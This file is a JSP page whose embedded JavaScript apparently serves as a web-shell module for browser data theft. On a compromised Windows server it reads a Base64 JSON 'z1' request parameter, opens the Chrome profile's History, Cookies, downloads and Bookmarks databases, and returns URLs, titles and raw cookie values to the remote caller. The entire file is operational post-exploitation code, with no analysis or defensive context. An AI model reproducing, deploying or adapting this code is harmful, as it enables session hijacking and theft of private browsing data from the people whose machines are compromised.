<%

(function() {
    var Paths = Java.type("java.nio.file.Paths");
    var Files = Java.type("java.nio.file.Files");
    var StandardCopyOption = Java.type("java.nio.file.StandardCopyOption");
    var DriverManager = Java.type("java.sql.DriverManager");
    var File = Java.type("java.io.File");
    var Base64 = Java.type("java.util.Base64");
    var Map = Java.type("java.util.Map");
    var HashMap = Java.type("java.util.HashMap");
    var ArrayList = Java.type("java.util.ArrayList");

    var chrome_base = "";
    var profile_dir = "Default";
    var chrome_dir = "";

    function dump_history() {
        var history_file = new File(chrome_dir, "History");
        if (!history_file.exists()) return [];

        var dst = File.createTempFile("sqlite_", ".tmp");
        try {
            Files.copy(history_file.toPath(), dst.toPath(), StandardCopyOption.REPLACE_EXISTING);
        } catch (e) {
            return [];
        }

        var results = [];
        var conn = null, stmt = null, rs = null;
        try {
            Class.forName("org.sqlite.JDBC");
            conn = DriverManager.getConnection("jdbc:sqlite:" + dst.getAbsolutePath());
            stmt = conn.createStatement();
            rs = stmt.executeQuery("SELECT url, title, last_visit_time FROM urls");

            while (rs.next()) {
                var row = {};
                row["URL"] = rs.getString("url");
                row["Title"] = rs.getString("title") != null ? rs.getString("title") : "";
                row["LastUsed"] = rs.getLong("last_visit_time");
                results.push(row);
            }
        } catch (e) {
            // do something
        } finally {
            try { if (rs) rs.close(); } catch (e) {}
            try { if (stmt) stmt.close(); } catch (e) {}
            try { if (conn) conn.close(); } catch (e) {}
            if (dst.exists()) dst.delete();
        }

        return results;
    }

    function dump_cookie() {
        var cookie_file = new File(chrome_dir + File.separator + "Network", "Cookies");
        if (!cookie_file.exists()) {
            cookie_file = new File(chrome_dir, "Cookies");
        }

        if (!cookie_file.exists()) return [];

        var dst = File.createTempFile("sqlite_", ".tmp");
        try {
            Files.copy(cookie_file.toPath(), dst.toPath(), StandardCopyOption.REPLACE_EXISTING);
        } catch (e) {
            return [];
        }

        var results = [];
        var conn = null, stmt = null, rs = null;
        try {
            Class.forName("org.sqlite.JDBC");
            conn = DriverManager.getConnection("jdbc:sqlite:" + dst.getAbsolutePath());
            stmt = conn.createStatement();
            rs = stmt.executeQuery("SELECT host_key, name, value FROM cookies");

            while (rs.next()) {
                var row = {};
                row["Host"] = rs.getString("host_key");
                row["Name"] = rs.getString("name");
                row["Value"] = rs.getString("value");
                results.push(row);
            }
        } catch (e) {
            // do something
        } finally {
            try { if (rs) rs.close(); } catch (e) {}
            try { if (stmt) stmt.close(); } catch (e) {}
            try { if (conn) conn.close(); } catch (e) {}
            if (dst.exists()) dst.delete();
        }

        return results;
    }

    function dump_download() {
        var history_file = new File(chrome_dir, "History");
        if (!history_file.exists()) return [];

        var dst = File.createTempFile("sqlite_", ".tmp");
        try {
            Files.copy(history_file.toPath(), dst.toPath(), StandardCopyOption.REPLACE_EXISTING);
        } catch (e) {
            return [];
        }

        var results = [];
        var conn = null, stmt = null, rs = null;
        try {
            Class.forName("org.sqlite.JDBC");
            conn = DriverManager.getConnection("jdbc:sqlite:" + dst.getAbsolutePath());
            stmt = conn.createStatement();
            rs = stmt.executeQuery("SELECT target_path, tab_url, total_bytes, start_time FROM downloads");

            while (rs.next()) {
                var row = {};
                var targetPath = rs.getString("target_path");
                row["FileName"] = targetPath != null ? targetPath : "";
                row["TargetPath"] = targetPath != null ? targetPath : "";
                var tabUrl = rs.getString("tab_url");
                row["URL"] = tabUrl != null ? tabUrl : "";
                row["Length"] = java.lang.Long.valueOf(rs.getLong("total_bytes")).intValue();
                var startTime = rs.getString("start_time");
                row["Date"] = startTime != null ? startTime : "";
                results.push(row);
            }
        } catch (e) {
            // do something
        } finally {
            try { if (rs) rs.close(); } catch (e) {}
            try { if (stmt) stmt.close(); } catch (e) {}
            try { if (conn) conn.close(); } catch (e) {}
            if (dst.exists()) dst.delete();
        }

        return results;
    }

    function parseBookmarksNode(node, results) {
        if (node && typeof node === 'object') {
            if (node.type === 'url') {
                results.push({
                    'name': node.name || '',
                    'url': node.url || ''
                });
            }
            
            if (node.children && Array.isArray(node.children)) {
                for (var i = 0; i < node.children.length; i++) {
                    parseBookmarksNode(node.children[i], results);
                }
            }
        }
    }

    function dump_bookmark() {
        var bookmark_file = new File(chrome_dir, "Bookmarks");
        if (!bookmark_file.exists()) return [];

        var results = [];
        try {
            var content = new java.lang.String(Files.readAllBytes(bookmark_file.toPath()), "UTF-8");
            var json = JSON.parse(content);
            
            if (json && json.roots) {
                var roots = json.roots;
                for (var key in roots) {
                    if (roots.hasOwnProperty(key)) {
                        parseBookmarksNode(roots[key], results);
                    }
                }
            }
        } catch (e) {
            // do something
        }

        return results;
    }

    function do_init() {
        var appdata = java.lang.System.getenv("LOCALAPPDATA");
        if (!appdata) {
            var userProfile = java.lang.System.getenv("USERPROFILE");
            appdata = userProfile ? userProfile + "\\AppData\\Local" : "";
        }

        if (!appdata) return false;

        chrome_base = appdata + "\\Google\\Chrome\\User Data";
        var dir = new File(chrome_base);
        return dir.isDirectory();
    }

    function main() {
        if (!do_init()) {
            out.print("[-] Initialization failed: " + chrome_base);
            return;
        }

        var z1Param = request.getParameter("z1");
        if (!z1Param) {
            out.print("[-] Invalid JSON / Base64.");
            return;
        }

        try {
            var decodedBytes = Base64.getDecoder().decode(z1Param);
            var jsonStr = new java.lang.String(decodedBytes, "UTF-8");
            var config = JSON.parse(jsonStr);

            var action = config.action || "";
            var profile = config.profile || "Default";

            profile_dir = profile;
            chrome_dir = chrome_base + File.separator + profile;

            var responseData = {
                'status': 'success',
                'action': action,
                'data': []
            };

            switch (action) {
                case 'history':
                    responseData.data = dump_history();
                    break;
                case 'cookie':
                    responseData.data = dump_cookie();
                    break;
                case 'download':
                    responseData.data = dump_download();
                    break;
                case 'bookmark':
                    responseData.data = dump_bookmark();
                    break;
                default:
                    out.print("[-] Unknown action: " + action);
                    return;
            }

            out.print(JSON.stringify(responseData));
        } catch (e) {
            out.print("[-] Invalid JSON / Base64.");
        }
    }

    main();
})();

%>